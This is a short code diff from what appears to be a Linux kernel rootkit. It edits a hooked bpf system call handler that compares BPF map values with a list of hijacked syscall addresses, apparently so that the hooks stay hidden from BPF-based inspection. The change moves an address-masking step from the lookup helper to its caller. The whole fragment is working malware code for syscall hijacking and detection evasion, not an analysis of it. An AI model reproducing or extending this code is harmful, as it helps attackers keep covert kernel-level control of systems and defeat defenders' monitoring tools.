@@ -390,10 +390,9 @@ static u32 bpf_map_value_size(struct bpf_map *map)
 
 static unsigned long _get_sys_addr(unsigned long addr) {
     struct sys_addr_list *sl, *sl_safe;
-    unsigned long a = addr & 0xfffffffffffffff0;
     list_for_each_entry_safe(sl, sl_safe, &sys_addr, list) {
-        if(sl->addr == a) {
-            prinfo("bpf match: %lx -> %lx\n", sl->addr, a);
+        if(sl->addr == addr) {
+            prinfo("bpf match: %lx -> %lx\n", sl->addr, addr);
             return sl->addr;
         }
     }
@@ -472,7 +471,7 @@ static asmlinkage long m_bpf(struct pt_regs *regs) {
              * Now we check if value (stored syscall address)
              * is among the ones we are hijacking
              */
-            s = _get_sys_addr(*(unsigned long*)value);
+            s = _get_sys_addr(*(unsigned long*)value & 0xfffffffffffffff0);
             if (s != 0UL) {
                 void *v = kmalloc(value_size, GFP_KERNEL);
                 if (v) {
